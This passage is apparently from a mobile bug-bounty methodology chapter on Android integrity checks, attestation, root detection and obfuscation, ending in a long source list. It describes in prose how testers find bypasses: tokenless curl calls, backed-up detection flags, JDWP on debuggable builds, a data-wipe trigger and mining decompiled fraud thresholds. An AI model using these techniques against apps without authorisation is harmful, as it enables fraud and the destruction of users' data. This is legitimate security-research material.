| "`attestationSecurityLevel: Software` on my test device" | On a standard AVD the Keystore is software-backed and the chain terminates in Google's Software attestation root — an artefact of the harness | The same observation reproduced on a **physical** device, or the server accepting a software-rooted chain for a hardware-gated action (D21-030) |
| "The app asks for battery-optimisation exemption" | A functional request, not a security defect, on its own | A code path or on-screen instruction that disables Play Protect, relaxes SELinux, or talks the user through sideloading (D21-040) |
| "The obfuscated build took me two days to understand" | Effort is not a severity axis, and MASVS-RESILIENCE-3 is explicitly about raising cost, not preventing access | What you found at the end of the two days |

## Cross-surface joins

- **Play Integrity verdict × the backend's *other* clients (D21-013/-015 × D15 × D21-054).** The mobile
  team wires attestation into the mobile client; the web client and the partner API call the same
  endpoints with no integrity header at all, because they cannot produce one. Nobody reviews the two
  together. Enumerate every endpoint that carries a token from the app, then call each one from `curl`
  with a valid session and no token — the endpoints that answer are the ones where the control was never
  a control. This is the single highest-yield join in the chapter, and it needs no device bypass.
- **Detection verdict × the backup set (D21-035 × D11 × D02).** The resilience reviewer tests whether the
  check can be hooked; the storage reviewer inventories `allowBackup` and shrugs because "it's only
  preferences". The join is the intersection: a cached `integrity_ok` or `tamper_strikes` value that is
  both consumed on next launch **and** in the backup set is a detection bypass with no instrumentation at
  all, at a far weaker attacker model than anything else in this domain.
- **Tamper-response trigger × shared-storage write (D21-039 × D07 × D11).** Two teams own the halves: the
  security team wrote a response that wipes data on detection, and the storage team allowed a path on
  shared storage that the check inspects. Neither is a finding alone. Together, any zero-permission app on
  the device destroys the client's users' data — the only Critical in this chapter, and it is found by
  grepping the detection code for `wipeData` and then asking who can write the path it looks at.
- **Obfuscation coverage × the fraud engine (D21-051 × D23).** The app-security reviewer rates
  obfuscation as P5 and moves on; the fraud team never sees the decompile. The join is to grep the
  decompiled output specifically for the fraud engine's constants — thresholds, velocity limits, amount
  bands, allowlisted account ids — because those are the values that turn a P5 hardening gap into a
  structuring attack with a number attached.
- **Attestation nonce × PII (D21-022 × D20).** The integrity integration and the privacy review never
  meet. The nonce is a security control to one team and an opaque blob to the other, and in between
  somebody put the user's email in it. One base64 decode answers it, and it is a disclosure to a third
  party outside the declared data flow.
- **App Check enforcement × Firebase rules (D21-025 × D18).** The Firebase rules reviewer argues "an
  attacker would need to be in the app"; the App Check console is owned by a different team and is set to
  monitoring-only. Read the two together and the "on-device only" mitigation in every Firestore finding
  evaporates — which changes those findings' attacker model from AM-12 to AM-01.
- **`android:debuggable` × the entire resilience budget (D21-047 × D02 × D14).** A debuggable release is
  usually filed as a hardening issue by whoever finds it in the manifest. Read it beside the RASP
  inventory and the NSC: it makes every detection routine bypassable via JDWP with no root, makes
  `<debug-overrides>` live, and makes `run-as` a data-extraction primitive. The client paid for a RASP SDK
  and shipped the key to it in the manifest.
- **Key-attestation chain × the session it is supposed to bind (D21-031 × D13).** The crypto reviewer
  validates the chain; the auth reviewer validates the session. Nobody asks whether the *same* hardware
  that produced the chain signs anything afterwards. If it does not, a chain generated on a clean phone
  binds nothing, and every "device-bound" claim in the product documentation is false.
- **SafetyNet remnant × App Check provider (D21-021 × D21-025 × D18).** An app can carry a dead
  `SafetyNetAppCheckProviderFactory` while the team believes App Check is enforcing. The dependency scan
  finds the library and calls it outdated; the backend team sees App Check enabled in the console.
  The join is that the provider has returned failures since January 2025 and nobody read the enforcement
  metrics.
- **RASP vendor `.so` × the dependency inventory (D21-043 × D16 × D17).** The SDK reviewer inventories
  analytics and ad libraries and treats the security SDK as a control rather than as a dependency. Its
  native component is the one nobody version-checks, and it is loaded first, in-process, on every launch.

## Sources

- **OWASP MASTG / MASVS / MASWE:** MASTG-TEST-0324, -0325 (root detection references and runtime use),
  -0338 (storage integrity, `false_negative_prone: true`), -0341 (runtime hook detection and its named
  sensitive-API list), -0351 (emulator detection), -0352/-0353 (debugging detection), -0368/-0369
  (insufficient obfuscation, Java/Kotlin and native, with their attack scenarios), -0263/-0264/-0265
  (StrictMode); deprecated -0045, -0046, -0049, -0051. MASTG-TECH-0008, -0013, -0016, -0017, -0018,
  -0023, -0024, -0031, -0032, -0039, -0040, -0043, -0144 (Bypassing Root Detection), -0157, -0165
  (Identifying Compilers, Obfuscators and Packers). MASTG-KNOW-0027, -0028, -0030, -0031, -0032, -0033,
  -0034 (Device Binding), -0035 (Play Integrity verdict values, nonce best practice, `APP_NOT_INSTALLED`
  / `APP_UID_MISMATCH`, 10,000/day default quota), -0036, -0044 (Key Attestation), -0118 (RASP), -0119,
  -0120. MASTG-BEST-0007, -0029, -0030, -0041, -0046, -0047, -0066. MASTG-TOOL-0001, -0009 (APKiD),
  -0011, -0018, -0019, -0021 (Magisk, Zygisk + DenyList, and the caveat that DenyList is not kernel-level
  hiding), -0029/-0038 (objection), -0034 (LIEF), -0100 (reFlutter), -0103 (uber-apk-signer), -0146
  (RootBeer), -0147 (Android RASP), -0149 (LSPosed), -0151, -0152, -0153 (dProtect). MASWE-0006, -0039,
  -0040, -0051, -0053, -0054, -0056, -0057, -0058, -0059, -0061, -0064. MASVS-RESILIENCE-1/-2/-3/-4,
  MASVS-CODE-4, and the MASVS statement that "the absence of any MAS-R measures does not inherently
  introduce vulnerabilities". Semgrep rules `mastg-android-root-detection`, `mastg-android-debugger-checks`,
  `mastg-android-native-debugger-checks`, `mastg-android-strictmode`.
- **Bugcrowd VRT (release 2026-07-08, 581 entries):** `lack_of_binary_hardening|lack_of_jailbreak_detection`,
  `|lack_of_obfuscation`, `|runtime_instrumentation_based`, `|lack_of_exploit_mitigations` — all **P5**
  with the baseline vector `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N` and CWE-693;
  `broken_access_control|privilege_escalation` (**VARIES**, CWE-269);
  `broken_authentication_and_session_management|authentication_bypass` (**P1**);
  `application_level_denial_of_service_dos|critical_impact_and_or_easy_difficulty` (**P2**) and
  `|high_impact_and_or_medium_difficulty` (**P3**);
  `sensitive_data_exposure|disclosure_of_secrets|for_publicly_accessible_asset` (**P1**),
  `|for_internal_asset` (**P3**), `|pii_leakage_exposure` (**VARIES**);
  `cryptographic_weakness|insufficient_verification_of_data_authenticity|cryptographic_signature`
  (**VARIES**) and `|identity_check_value` (**P4**);
  `insecure_os_firmware|hardcoded_password|privileged_user` (**P1**);
  `insecure_data_storage|sensitive_application_data_stored_unencrypted|on_internal_storage` (**P5**);
  `mobile_security_misconfiguration|tapjacking` (**P5**);
  `using_components_with_known_vulnerabilities|outdated_software_version` (**P5**);
  `server_security_misconfiguration|no_rate_limiting_on_form|login` (**P4**);
  `broken_access_control|exposed_sensitive_android_intent` (**VARIES**).
- **Programme policy and VRP economics:** Google Mobile VRP non-qualifying "Attacks that require a rooted
  device"; Google Invalid Reports "Issues that only occur on rooted devices or the emulator"; Google's
  reporting guidance (device model, Android version and build number in the report **text**, and an
  explicit statement of non-standard device configurations); HackerOne Core Ineligible Findings ("Lack of
  jailbreak detection in mobile apps"); Xiaomi, Grab, Spotify, Starbucks, PayPal, Basecamp, Snapchat,
  Reddit, HackenProof and YesWeHack Gojek exclusion clauses quoted in the graveyard; HackenProof's
  reopening qualifier ("if the app doesn't promise root/jailbreak protection explicitly"); Samsung's
  ineligible-list principle ("a behavior of the software that is consistent with the security concept
  implemented by Samsung") and its downgrade factors for unlocked-bootloader and Developer-Mode
  preconditions; AOSP severity modifiers capping unlocked-bootloader and Developer-Mode attacks at "no
  higher than Low"; the Cobalt consultancy contrast on SoW engagements.
- **Android platform documentation:** Play Integrity overview and verdicts (`deviceIntegrity.
  deviceRecognitionVerdict` values `MEETS_DEVICE_INTEGRITY` / `MEETS_BASIC_INTEGRITY` /
  `MEETS_STRONG_INTEGRITY` / `MEETS_VIRTUAL_INTEGRITY` and the empty-verdict case;
  `appIntegrity.appRecognitionVerdict` `PLAY_RECOGNIZED` / `UNRECOGNIZED_VERSION` / `UNEVALUATED`;
  `accountDetails.appLicensingVerdict` `LICENSED` / `UNLICENSED` / `UNEVALUATED`;
  `environmentDetails.appAccessRiskVerdict.appsDetected` and `playProtectVerdict` value sets;
  `recentDeviceActivity` and `deviceRecall`; the `requestDetails` server check on `requestPackageName`,
  `requestHash`/`nonce` and `timestampMillis`; the "Do NOT" list — trust verdicts client-side, cache
  verdicts, make binary allow/deny decisions, rely solely on the API; the cleartext-visibility warning on
  `nonce`/`requestHash`; tiered enforcement Allow / Allow with limits / CAPTCHA / Deny). SafetyNet
  Attestation deprecation timeline (deprecated 2022, full turndown January 2025, `ApiException` status
  code 7). Security key attestation (server-side verification, Google attestation root, the
  first-occurrence-nearest-root rule, `attestationSecurityLevel`, the status/CRL and root endpoints, the
  official verifier, `attestationApplicationId` tag [709]) and AOSP keystore attestation (`KeyDescription`
  ASN.1, `RootOfTrust` with `verifiedBootKey` / `deviceLocked` / `verifiedBootState` / `verifiedBootHash`,
  `SecurityLevel` values). AOSP verified-boot device-state documentation. AOSP Conscrypt modular-system
  documentation (dual trust-store location, Android 14+). Android 12/15/16 behaviour-change pages and the
  app-compatibility test/debug guide (`am compat`, `device_config`). Android restricted-settings
  documentation (Android 13+). Firebase App Check documentation. Android's `android-debuggable` and
  test/debug-features risk pages. AOSP security-model paper §3 rule ③ and §4.7.
- **MITRE ATT&CK Mobile:** T1617 Hooking (Xposed/Magisk return-value modification; GodFather S1231;
  FjordPhantom S1208 "used hooking to return false information to detection mechanisms"; M1002, M1010 —
  and the note that the page does **not** mention Frida or Substrate, so neither is attributed to ATT&CK);
  T1633 / T1633.001 System Checks (motion-sensor and step-count evasion in Anubis S0422 and Cerberus;
  Chameleon's root and ADB checks); T1630.003 Disguise Root/Jailbreak Indicators (ATT&CK's own statement
  that a `su`-binary check "could be evaded by naming the binary something else"); T1629 / T1629.002 /
  T1629.003 Impair Defenses, Device Lockout, Disable or Modify Tools (AbstractEmu, BRATA S1094, Zen S0494)
  with detection DET0687; T1630.002 File Deletion; T1662 Data Destruction; T1471 Data Encrypted for
  Impact; T1642 Endpoint Denial of Service; T1655.001 Match Legitimate Name or Location; T1418.001;
  T1632 / T1632.001.
- **Community and vendor research:** HackTricks `android-anti-instrumentation-and-ssl-pinning-bypass.md`
  (the detection-surface map, stealth/renamed frida-server fingerprint list, late-attach behaviour) and
  `play-integrity-attestation-bypass.md` (weak-integration tester angles, device-verdict spoofing and its
  explicit scope limit, the hardware-attestation clean-device relay and its operational rules) and
  `android-application-level-virtualization.md`; the objection agent `root.ts` path list and full RootBeer
  method surface (`isRooted`, `checkForBinary`, `checkForDangerousProps`, `detectRootCloakingApps`,
  `checkSuExists`, `detectTestKeys`, `checkForRootNative`, `RootBeerNative.checkForRoot`) plus
  `JailMonkeyModule`; Frida CodeShare `@dzonerzy/fridantiroot` (and its documented hook list including
  `ApplicationPackageManager.getPackageInfo`, `SystemProperties.get`, `BufferedReader.readLine`,
  `ProcessBuilder.start`, all five `Runtime.exec` overloads, `libc!fopen`, `libc!system` and
  `KeyInfo.isInsideSecureHardware`), `@fdciabdul/frida-multiple-bypass`, `@Gand3lf/xamarin-antiroot`;
  Medusa `root_detection/universal_root_detection_bypass`; MobSF rules `android_detect_root`,
  `android_su_detect` (CWE-250), `android_dexguard_root_detection`, `android_detect_frida`,
  `android_safetynet`, `android_tapjacking` and mobsfscan `android_root_detection`,
  `android_safetynet_api`; drozer `app.package.debuggable` and `exploit.jdwp.check`; Mobile Hacking Lab's
  radare2 string -> xref -> function -> confirm loop and binary-patching workflow, and its anti-Frida
  bypass triad; the SourMint SDK research pattern for proxy/VPN/debugger-gated SDK behaviour; the Dirty
  Stream reference-hash-overwrite pattern; Guardsquare's key-attestation relay work and the Quarkslab
  relay research as cited in HackTricks.
- **Disclosed reports and the local senior-researcher corpus:** HackerOne #80512 (Coinbase, runtime
  invocation of the post-authentication method), #637194 (Shopify Android biometric bypass, Low, $500),
  #331489 and #490946 (lock-protection bypasses), #532836 (Exness, "This actions does not require root
  priv."), #56002 (Shopify, "No special permission or root required. No user interactions and
  awareness."), #258460 (Quora) — all cited for the framing rule that the bypass is never the finding and
  the root-free demonstration is what gets paid. Local corpus: the four-option integrity-blocker RoE
  decision, the six-condition root-required payability gate, and the "server-verified attestation cannot
  be forged locally — re-scope" rule.
- **Bug-hunting corpus (cross-domain discipline applied here):** the Body-Diff Rule (a byte-identical 200
  is not a bypass), the Layer-Ordering Trap (a validation error does not prove you passed the gate —
  re-test with a minimal well-formed `{}`), Server-Policy-vs-State, the Statistical-Sample Rule
  (n >= 10 interleaved, >= 2 sigma) for any rate-limit claim, the Shell-Loop Ban (count your results), the
  shadow/zombie-API behavioural-diff method as the mobile-to-backend bridge, client-only rate limits the
  API never enforces, the pre-severity gate run against the Critical claim, the five-screenshot
  state-change pattern, HAR sanitising with the mask/leave-visible split, retraction-appendix discipline
  and its inversion for client-patched findings, and chain-filing order (primitives first, consumer
  second, backfill the ids).
